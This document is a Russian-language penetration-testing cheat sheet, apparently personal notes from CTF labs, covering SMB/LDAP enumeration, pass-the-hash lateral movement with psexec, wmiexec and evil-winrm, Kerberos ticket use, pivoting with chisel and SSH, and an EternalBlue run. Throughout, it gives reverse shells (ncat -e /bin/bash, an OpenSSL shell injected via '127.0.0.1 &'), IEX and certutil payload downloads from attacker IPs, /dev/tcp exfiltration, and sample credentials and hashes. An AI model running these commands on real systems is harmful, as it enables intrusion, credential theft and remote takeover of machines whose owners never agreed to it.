# LAN
	# захват пакетов из сети с последующим разшифрованием в wireshark
	tcpdump -i ens192 -s 65535 -w ilfreight_pcap

# Поиск дефолтеых паролей https://github.com/ztgrace/changeme

	https://github.com/ztgrace/changeme

# Назначение интерфейсу DHSP 

	sudo dhclient -1 enp0s8

# Обнаружение машин в сети

fping -ag 192.168.50.1/24 2>/dev/null 

# передача файлов по сети

https://steflan-security.com/shell-file-transfer-cheat-sheet/

# Подключение по РДП

rdesktop -u Administrator -p Admin123 -d ROOT.DC 192.168.50.200  

для машины в рабочей группе 

xfreerdp /v:[IP] /u:[USERNAME] /p:'[PASSWORD]' /d:[domain] /dynamic-resolution /drive:linux,/tmp

xfreerdp /v:192.168.50.200 /d:root.dc /u:administrator /p:Admin123

xfreerdp /v:192.168.50.200 /d:root.dc /u:Administrator /pth:hash_password (/p:hash??????)

xfreerdp /v:192.168.50.200 /d:root.dc /u:administrator /p:Password123 /sec:rdp  - если TLS не поддерживается

FreeRDP( установка sudo apt install freerdp2-x11), Vinagre (установка sudo apt install vinagre)

РДП из коммандной строки виндовс
mstsc /v:<адрес_компьютера>

# Поднять SMB сервер

Доступ к ресурсу SMB

	impacket-smbserver share .

	Get-Content //10.10.14.4/file

	net use z: //10.10.10.14/shares
	
 	sudo impacket-smbserver -smb2support -username max -password root sharename .
	
 	$pass = "root" | ConvertTo-SecureString -AsPlainText -Force

	$cred = New-Object System.Management.Automation.PsCredential('max, $pass')

	New-PSDrive -name max -root \10.10.14.14\share -Credential $cred -PSProvider "filesystem"
  
       	net use z: \\10.10.14.41\sharename /user:max root
     	
      	copy * Exfil:\
	copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
	xcopy //10.10.10.10./files/file.txt .

 	# Включите незащищённые гостевые входы (требуется админ права)
	Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "AllowInsecureGuestAuth" -Value 1 -Type DWord
 
# Поднять HTTP сервер

python3 -m http.server 8080

	goshs -p 4243
	certutil -urlcache -f http://10.10.16.32:4243/winPEASany.exe winPEASany.exe

# Cтянуть c HTTP сервера

curl -o file http://file

wget https://example.com/file.zip - стянуть файйл с сервера. 

для повершелл wget "http://10.18.35.17:8888/Zero.exe" -OutFile z1.exe

IEX(New-Object Net.WebClient).DownloadString ("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1 ")

iwr -uri http://192.168.x.xx/adduser.exe -OutFile adduser.exe

certutil.exe -f -split -urlcache http://ip/nc.exe c:\windows\temp\nc.exe

certutil -urlcache -f http://10.10.14.15:8001/Rubeus.exe Rubeus.exe

# Поднять NetCAt

На удалённом сервере запускаем Ncat следующим образом:
ncat -l -e "/bin/bash" 43210
nc -l -p <порт команды> -e cmd.exe
И подключаемся с локального компьютера:
ncat 185.26.122.50 43210

Подключение к Ncat если удалённая машина находиться за NAT
На локальном компутере
ncat -l 43210
А на удалённом компьютере мы запускаем программу так:
ncat -e "/bin/bash" ХОСТ 43210

Как передать файлы на удалённый компьютер
С помощью Ncat можно выгрузить файлы на удалённый сервер. К примеру, мне нужно отправить файл some_stuff.txt. Тогда на сервере (куда будет загружен файл), запускаю:
ncat -lvnp 43210 > some_stuff.txt
А на локальном компьютере (с которого будет выгружен файл) запускаю:
ncat 185.26.122.50 43210 < some_stuff.txt

или можно отправить - cat some_stuff.txt > /dev/tcp/10.10.14.7/43210

Когда закончится передача, обе сессии ncat завершаться.

Как загрузить файл с удалённого компьютера
Предположим, мне нужно скачать с удалённого компьютера файл some_stuff.txt. Тогда на сервере я запускаю:
ncat -l 43210 < some_stuff.txt
А на локальном компьютере, куда будет скачен файл, запускаю Ncat следующим образом:
ncat 185.26.122.50 43210 > some_stuff.txt


# выполнение CMD на удаленной машине разными портами

ВиинРМ из виндовс

		winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

# Мы можем добиться того же с помощью Powershell, но для передачи других учетных данных нам нужно будет создать объект PSCredential:

$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

Получив объект PSCredential, мы можем создать интерактивный сеанс с помощью командлета Enter-PSSession:

Enter-PSSession -Computername TARGET -Credential $credential

Powershell также включает командлет Invoke-Command, который удаленно запускает ScriptBlocks через WinRM. Учетные данные также должны передаваться через объект PSCredential:

Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}




PSEXEC ПО БЕЛЕТУ PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
smbexec через ntlmrelay  proxychains4 -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass

https://www.thehacker.recipes/a-d/movement/ntlm/pth

winexe -U 'admin%password123' //10.10.0.66 cmd.exe

(ПО БЕЛЕТУ)

PSExec.exe -accepteula \\sql01.inlanefreight.local cmd  

PsExec64.exe \\dc01 cmd.exe   (порт 445 smb)

Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)

Имперсонификация PsExec64.exe -i -s cmd PsExec64.exe -i -u "nt authority\local service" cmd

impacket-psexec authority.htb/svc_@10.10.11.222 -s cmd (нужен пароль)

impacket-psexec Administrator@192.168.50.200 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff

для psexec reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# wmi-exec

	impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.10.10.100

	impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 root.dc/administrator@192.168.50.200  (CMD не надо!!!)

	скачать (в wmiexec) файл
  	lget system.save

pth-winexe -U ROOT.DC/Administrator%Password123 //192.168.50.200 cmd  (протокол smb порт 445) 

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 //192.168.50.200 cmd

# Evil-winrm

evil-winrm -i 192.168.50.200 -u Administrator -H 58a478135a93ac3bf058a5ea0e8fdb71   (протокол winRM порт 5985 или 5986)

evil-winrm -i 10.129.216.184 -u svc_ -p _1n_th3_cle4r!
      - menu (можно обходить повершелл)
      
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S (для захода по сертификату)

	* для захода по керберос

 	faketime "$(ntpdate -q mirage.htb | awk '{print $1" "$2}')" bash
  
	impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m
	
 	impacket-getTGT voleur.htb/administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
 	
  	export KRB5CCNAME=jeremy.combs.ccache
		nxc smb dc.voleur.htb -d voleur.htb -k --generate-krb5-file krb5.conf
	sudo mv krb5.conf /etc/krb5.conf
	
 	evil-winrm -r voleur.htb -i dc.voleur.htb (для захода по kerberos)

in /etc/krb5.conf

[libdefaults]
	default_realm = SCRM.LOCAL

[realms]
	SCRM.LOCAL = {
		 kdc = dc1.scrm.local 
   }

[domain_realm]
scrm.local = SCRM.LOCAL
	scrm.local = SCRM.LOCAL

# Можно сгенерить /etc/krb5.conf

	nxc smb dc.voleur.htb -d voleur.htb -k --generate-krb5-file krb5.conf
	sudo mv krb5.conf /etc/krb5.conf

# smbexec
	smbexec administrator:pasword123@192.168.50.200

	impacket-smbexec active.htb/Administrator:Ticketmaster1968@10.10.10.100

# Сетевые сервисы SSH

 	ssh -N -f -D 1080 htb-student@10.129.205.205   -N - не открывать шелл, -f - фоновый режим

	отключение ключей 
  	ssh -o 'PubkeyAuthentication=no' juliette@10.10.10.228
	scp -o 'PubkeyAuthentication=no' juliette@10.10.10.228:/Users/juliette/AppData/local/packages/microsoft.microsoftstickynotes_8wekyb3d8bbwe/LocalState/* . 

--Создание ключей
	
 	ssh-keygen -f theseus
	key.pub - бросаем на сервер и переименовываем в authorized_keys
 	своц ключ помечаем chmod 600
  
(по умолчанию ключ называется id_rsa и id_rsa.pub)

ssh john@10.8.0.14

Передадим файл на удаленную машину по SSH с помощью scp

scp winPEASx64.exe helpdesk@192.168.50.38:C:\\Users\\helpdesk\\

scp pspy64s floris@10.10.10.150:/tmp

(Надо находится снаружи машины, в директории где файл)

и обратно

scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip RT300010.zip

scp -i ./rsa/2048/4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth:/home/n30/code .

!!!sftp Administrator@10.10.223.139   (как FTP)

 - Основные пользовательские ключи обычно хранятся в директории `~/.ssh/id_rsa` (домашняя директория пользователя).

~/.ssh/id_rsa
~/.ssh/id_rsa.pub

ssh ключи всегда хранятся в папке пользователя user/.ssh

если у меня есть #id_rsa# а на серваке id-rsa.pub

(ключи всегда должны быть chmod 600)

то можно !!!!! ssh -i id_rsa daniel@10.129.95.192 !!!!!!

для доступа к закрытому ключу может потребоваться кодовая фраза, тогда

ssh2john id_rsa > hash_rsa  
                                                                                                                                               
john hash_rsa --wordlist=/usr/share/wordlists/rockyou.txt


ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth (ключ приватный)

# FTP

wget -m --no-passive ftp://10.10.10.98


# Включение линукс как прокси сервер
---на linux
echo 1>/proc/sys/net/ipv4/ip_forward
sudo iptables -A FORWARD -i tun0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o tun0 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -s 192.168.50.0/24 -o tun0 -j MASQUERADE
---на windows
route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123 

# ПРОБРОС ПОРТОВ ПО SSH

у меня открывается 4444 на localhost и пробрасывается на 5432 228.195 тачки

ssh -L 4444:localhost:5432 christine@10.129.228.195

psql -U christine -h localhost -p 4444

sshuttle -r ebelford:'ThePlague61780'@10.10.11.54 -N 0.0.0.0/24 (проброс всего трафика)

# ПРОБРОС ТРФИКА GOST

	https://github.com/ginuerzh/gost
	на сервере открываем прокси
 	./gost -L=:1338
  	у себя
   	http_proxy=127.0.0.1:1338  curl 172.21.0.2/.dev -o .dev


 
# ПРОБРОС ТРАФИКА - CHISEL

- У себя
в файле /etc/proxychains4.conf
<img width="1192" height="160" alt="image" src="https://github.com/user-attachments/assets/18b919d3-410f-4f7a-9168-ece4c37bc4cb" />


./chisel server --reverse --socks5 -p 8001
![image](https://github.com/user-attachments/assets/1b9893b2-8f35-4f62-beb4-e3b386aa76b2)


-- на удаленной машине

.\chisel.exe client 10.10.14.19:8001 R:socks
![image](https://github.com/user-attachments/assets/167db7ab-8cbe-4bc6-8e3f-57f3103d1a37)

Мой кали ip 10.10.14.19

	proxychains curl ....
	
 	proxychains nxc smb 192.168.100.100
  
-----------------------------------------------------
	- У себя

	./chisel server --port 9090 --reverse
	в файле /etc/proxychains4.conf ----->>>>    socks5  127.0.0.1 1080

	-- на удаленной машине

	 .\chisel.exe client (атакующий) 10.71.101.248:9090 R:socks
  

*******************************************************
- На атакуемом хосте:
  
.\chisel.exe client (мой хост)10.71.101.248:9090 R:80:(атакуемый хост)127.0.0.1:80

- У себя

./chisel server --port 9090 --reverse

(таким образом обращаясь к нашему локал хост или 10.71.101.248 на порт 8000 мы попадаем на 80 атакуемого хоста)


# Динамический проброс портов и тунелирование SSH

	cat /etc/proxychains4.conf
		socks4         127.0.0.1 9050

	ssh -D 9050 vboxuser@192.168.50.200 -------- (на локал хост открываем порт 9050 и через proxychains выходим напрямую от себя на 9050 проксисервера 50.200 )
       
	proxychains nmap 10.0.2.10 

# Проброс портов Metasploit
	
 	portfwd add -l 3306 -r 127.0.0.1 -p 14406
	meterpreter> portfwd add -l 8008 -p 2222 -r 192.168.0.101
 
# Смена таблици маршрутицации 

	sudo ip route add 192.168.134.0/24 via 10.200.100.6
	
 	route ADD 192.168.135.0 MASK 255.255.255.0  10.200.100.5 

# Проброс експлойтов метасплойт через ssh проброс портов

ssh -D 9050 vboxuser@192.168.50.200  (на локал хост 50.200 открываем порт 9050 и через proxychains выходим напрямую от себя на 9050 проксисервера )

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.0.2.10
rhosts => 10.0.2.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.0.2.15
lhost => 10.0.2.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set proxies socks4:127.0.0.1:9050
proxies => socks4:127.0.0.1:9050              
msf6 exploit(windows/smb/ms17_010_eternalblue) > set reverseallowproxy true
reverseallowproxy => true
msf6 exploit(windows/smb/ms17_010_eternalblue) > set reverselistenerbindaddress 127.0.0.1
reverselistenerbindaddress => 127.0.0.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > set reverselistenerbindport 4455

потом
ssh -R 4444:127.0.0.1:4455 vboxuser@192.168.50.200 -vN

и RUN
      

# Сетевые шары

# SMB

smbcacls -N '//10.10.10.103/Department Shares'

smbclient -N -L //$target - Используя нулевой сеанс

smbclient -N  //$target/Home

smbclient -L 10.10.217.189 - подключение по смб

smbclient --no-pass //10.10.217.189/Users -смотрим папки

smbclient //10.10.218.125/users -c 'recurse;ls'   (Ркурсивно просмотреть все шары)

*** Скачать рекурсивно все файлы изнутри

smb: \> recurse on
smb: \> prompt off
smb: \> mget *



smbclient //192.168.50.232/Users -U ''

smbclient -N //192.168.50.232/Users 

smbclient //192.168.50.232/Users -U Alexs

smbclient -L 192.168.50.200 -U Administrator

smbclient //192.168.50.162/Users -U Alex - переход по директориям

<< smbclient \\\\192.168.50.232\\Users -U Alexs >>

impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248

impacket-smbclient -k absolute.htb/svc_smb@dc.absolute.htb -target-ip 10.10.11.181 (перед этим получить tgt и  export KRB5CCNAME= )

- shares - list available shares

- use {sharename} - connect to an specific share

smbmap -H 10.10.149.120 -u anonymous

smbmap -u '' -p '' -H 10.10.149.120

smbmap -u ' ' -p ' ' -H 10.10.149.120

smbmap -u 'a' -p ' ' -H 10.10.149.120

smbmap -H 10.129.14.128 -r notes	(рекурсивно просмотреть шару notes)

smbmap -H 10.129.14.128 --download "notes\note.txt"		(скачатьь файл из шары notes)

smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"		(загрузить файл в шару notes)

smbmap -u 'john' -p 'nt:lm_hash' -H 192.168.50.200

smbmap -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -H 10.10.10.100      !Для домена!

Скачать сетевую шару!!!

smbget -R smb://10.10.11.207/Development

Примонтировать smb шару

mount -t cifs //10.10.10.134/Backups /mnt/smb


# crackmapexec

Показать доступные пользователю шары

	crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares

	(сдампить название всех файлов в шарах)

	nxc smb -d voleur.htb --use-kcache dc.voleur.htb -M spider_plus 
	
 	(скачать файл через nxc)
  
	nxc smb -d voleur.htb --use-kcache dc.voleur.htb --share IT --get-file "First-Line Support/Access_Review.xlsx" Access_Review.xlsx   

 	
 
выполнение комманнд

crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' -x ipconfig

crackmapexec smb 10.10.38.153 -u 'nik' -p 'ToastyBoi!' --shares  -Доступные шары для узера

crackmapexec smb 10.10.11.222 -u '' -p '' --shares   -анонимный вход

парольные политики

crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' --pass-pol

crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' -local-auth --sam

Перечисление открытых шар сети

crackmapexec smb 192.168.50.200/24

crackmapexec smb 192.168.50.162 -u 'Kevin' -p dict.txt Побрутить пароли в СМБ

crackmapexec smb razor.thm -u wili -p poteto --rid-brute брутит пользователей домена

crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --users  (Показать всех пользователей домена)


https://wiki.porchetta.industries/smb-protocol/enumeration/enumerate-domain-users

-------------------------------------------------снаружи домена 
сенить пароль пользователя smb

smbpasswd -r razo.thm -U bardkey

-------------еще энумерация SMB------------------------
enum4linux 10.10.11.108 


# RPC client (использует smb)
rpcclient 10.10.38.153 -U nik - нужен пароль - может перечислять пользователей и группы в Домене  (Remote Procedure Call работает на портах TCP 135 и UDP 135)

rpcclient 10.10.38.153 -U "" -N  - не нужен пароль

enumdomusers - перчисляет пользователей 

enumdomgroup - перечисляет группы

queryusergroups 0x47b - к какой группе принадлежит

querygroup 0x201 - что за группа

queryuser 0x47b - инфо о пользователе

 Она может использоваться для выполнения различных действий, таких как получение информации о доступных службах, выполнение удаленных процедур и т. д.

-------------еще энумерация SMB------------------------
enum4linux 10.10.11.108 


# LDAP (Стоит проверить, разрешает ли служба LDAP анонимные привязки, с помощью инструмента ldapsearch.- имена даты пароли и т.д все выдвет!!!!)

!!!!!Временные метки ЛДАП

	ldapsearch -x -H ldap://sizzle.htb.local -s base namingcontexts

https://www.epochconverter.com/ldap

	ldapsearch -H ldap://192.168.2.251 -x -D 'ЛаврентьевАВ@ta-d.local' -w '414216819' -b 'dc=ta-d,dc=local' "(&(objectClass=user)(memberOf=CN=Администраторы домена,CN=Users,DC=ta-d,DC=local))" | grep sAMAccountName

---Выбираем user из группы Администраторы домена

ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub

ldapsearch -H ldap://10.10.10.20 -x -b "DC=htb, DC=local" '(objectClass=User)' "sAMAccountName" | grep sAMAccountName    (выбираем имена)

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb, DC=local" '(objectClass=User)' (толлко юзеры!!!)


(может сразу не работать!!!)

ldapsearch -H ldap://10.10.10.161 -x

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb, DC=local"

ldapsearch -H ldap://10.10.10.20 -x -b "DC=htb, DC=local" '(objectClass=User)' "sAMAccountName" | grep sAMAccountName

ldapsearch -H ldap://dc1.scrm.local -U ksimpson -b 'dc=scrm,dc=local'

	ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts (Инфо о домене)
 	
	ldapsearch -x -H ldap://10.10.10.182 -s sub -b 'DC=cascade,DC=local' (Инфо в домене)

 	cat ldap_info| awk '{print $1}' | sort| uniq -c| sort -nr | grep ':'


можно попробовать -
[windapsearch](https://github.com/ropnop/windapsearch)

-------------еще энумерация LDAP и поиск доменных юзеров------------------------

impacket-GetADUsers egotistical-bank.local/ -dc-ip 10.10.10.175 -debug

impacket-GetADUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -all

------------еще ldap-shell

https://github.com/PShlyundin/ldap_shell


# Доступные диски для монтирования mountd 2049

showmount -e 10.10.149.120 
showmount показывает нам какие файловые системы доступны для монтирования
$ mkdir smb
$ sudo mount -t nfs -o vers=2 10.10.149.120:/users ./smb
$ sudo -i


# Responder (слушаем интерфейс)

sudo responder -I tun0 -wdF

sudo tcpdump -i wlan0 icmp


rsync 10.129.228.37::public/flag.txt flag.txt

# КАК OPEN SSL может стать реверс шелом

	--часть кода ---->   127.0.0.1 & cmd /c "FOR /l %i in (1,1,1000) DO C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:%i"
# OpenSSL Reverse Shell

	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
	openssl s_server -quiet -key key.pem -cert cert.pem -port 73		----> в одном окне
	openssl s_server -quiet -key key.pem -cert cert.pem -port 136		----> в другом окне

 	из атакуемой машины (73 и 136 толко открытые)---> 127.0.0.1 & START "" cmd /c "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:136"


# Недостатки конфигурации периферийных устройств
